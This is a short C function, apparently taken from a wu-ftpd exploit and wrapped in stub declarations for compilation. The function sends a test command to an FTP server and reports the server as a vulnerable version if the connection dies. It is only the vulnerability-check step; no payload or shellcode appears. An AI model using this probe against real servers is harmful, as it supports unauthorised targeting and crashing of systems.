
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int u_int ;
typedef int gt_bf ;


 int CMD_ERROR ;
 int FAD ;
 int GET_R ;
 int NRL ;
 int SCS ;
 int fprintf (int ,char*) ;
 int memset (char*,int,int) ;
 int read (int,char*,int) ;
 int send (int,char*,int ,int) ;
 int sleep (int) ;
 int stdout ;
 int strlen (char*) ;
 scalar_t__ strstr (char*,int ) ;

int check_exp(int sock)
{
 int conn_died;
 char gt_bf[(GET_R)];

 fprintf(stdout,"\n [+] Check exploit test ...\n");
 send(sock,"X82\r\n",strlen("X82\r\n"),(NRL));
 (u_int)sleep(SCS);
 memset((char *)gt_bf,(NRL),sizeof(gt_bf));
 conn_died=read(sock,gt_bf,sizeof(gt_bf)-1);

 if(strstr(gt_bf,(CMD_ERROR)))
 {
  fprintf(stdout," [X] After test exploit, wu-ftpd is alive.\n");
  return(FAD);
 }
 else if(conn_died<=(NRL))
 {
  fprintf(stdout," [*] Ok, This is vulnerable version.\n\n");
  return(SCS);
 }
 else return(FAD);
}
